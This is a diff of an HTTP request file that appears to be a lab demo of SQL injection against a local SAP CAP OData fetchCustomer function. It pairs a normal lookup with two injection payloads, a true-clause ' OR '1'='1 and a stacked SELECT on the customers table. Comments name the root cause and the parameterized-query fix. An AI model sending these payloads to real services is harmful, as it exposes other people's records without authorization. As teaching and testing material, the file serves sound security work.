@@ -1,43 +1,48 @@
-@server=http://localhost:4004
-@username=incident.support@tester.sap.com
-@password=initial
+@server = http://localhost:4004
+@username = incident.support@tester.sap.com
+@password = initial
 
-### 🔒 SQL INJECTION VULNERABILITY DEMO
+### 🔒 SQL INJECTION VULNERABILITY DEMO (CAP OData Service)
 # =====================================================
-# VULNERABLE: Custom fetchCustomer OData Function
-# This demonstrates SQL injection in CAP services
-# The function uses direct string interpolation in services.js
+# VULNERABILITY: Unsafe string interpolation in `fetchCustomer` function
+# RISK: Full database exposure via SQL injection
+# ROOT CAUSE: Direct concatenation of user input into SQL query
+# FIX: Use parameterized queries (CAP's cds.parse.expr() or @restrict.where)
 # =====================================================
 
-  ### ✅ Test 1: Legitimate Customer Lookup
-  ### Action: Normal request with valid customer ID
-  ### Expected: Returns single customer record
-  ### Result: System returns data for customer ID 1004100
-  GET {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
-  {
-    "customerID": "1004100"
-  }
-  
-  ### 🚨 Test 2: SQL Injection True-Clause Attack
-  ### Action: Inject malicious payload ' OR '1'='1
-  ### Expected: Returns ALL customer records
-  ### Result: Full database exposure vulnerability
-  GET {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
-  {
-    "customerID": "1004100' OR '1'='1"
-  }
-
-  ### 🚨 Test 3: SQL Injection -  multiple sql statements
-  ### Payload: 'UNION SELECT * FROM Customers --"   (multiple sql statements)
-  ### Expected: Returns empty array
-  GET  {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
+### ✅ Test 1: Legitimate Request (Sanity Check)
+# Purpose: Verify normal functionality
+# Payload: Valid customerID
+# Expected: Single customer record (HTTP 200)
+GET {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
 
 {
-     "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
+  "customerID": "1004100"
+}
+
+### 🚨 Test 2: Basic SQL Injection (True-Clause Attack)
+# Payload: ' OR '1'='1
+# Expected: Returns ALL customer records (HTTP 200)
+# Impact: Unauthorized data access
+GET {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
+
+{
+  "customerID": "1004100' OR '1'='1"
+}
+
+### 🚨 Test 3: Union-Based SQL Injection (Multi-Statement Attack)
+# Payload: '; SELECT * FROM sap_capire_incidents_Customers;--
+# Expected: 
+#   - CAP's SQLite adapter blocks multiple statements (HTTP 400)
+#   - Other databases (HANA/PostgreSQL) might execute both queries
+GET {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
+
+{
+  "customerID": "1004100'; SELECT * FROM sap_capire_incidents_Customers;--"
 }
